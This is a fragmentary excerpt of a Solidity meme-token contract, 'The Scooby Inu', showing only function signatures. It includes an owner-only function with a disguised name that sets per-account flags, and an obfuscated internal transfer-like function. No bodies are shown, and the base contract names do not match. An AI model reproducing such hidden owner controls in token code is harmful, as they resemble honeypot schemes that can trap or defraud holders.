...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function SolveMysteries(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _ScoobyDoobieDoooo(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract TheScoobyInu is ERC20ScoobyDoo {
    constructor() ERC20ScoobyDoo("The Scooby Inu", "SCOOBYINU", false, true, 800, 25, msg.sender, 2500000000 * 10 ** 18, msg.sender, 854) {
    }
}